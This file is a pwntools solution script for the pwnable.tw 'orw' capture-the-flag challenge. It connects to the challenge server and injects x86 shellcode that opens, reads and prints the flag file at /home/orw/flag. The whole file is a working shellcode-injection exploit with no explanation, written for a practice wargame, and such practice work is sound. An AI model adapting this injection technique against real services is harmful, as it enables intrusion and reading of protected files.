#!/usr/bin/env python

from pwn import *

# r = process('./orw')
r = remote('chall.pwnable.tw', 10001)

shellcode = asm('''
            push 0x00006761
            push 0x6c662f77
            push 0x726f2f65
            push 0x6d6f682f
            mov ebx, esp
            xor ecx, ecx
            xor edx, edx
            mov eax, 5
            int 0x80

            mov ebx, eax
            mov ecx, 0x0804a040
            mov edx, 0x30
            mov eax, 3
            int 0x80

            mov ebx, 1
            mov ecx, 0x0804a040
            mov edx, 0x30
            mov eax, 4
            int 0x80
            ''')

r.recvuntil(':')
r.send(shellcode)

r.interactive()
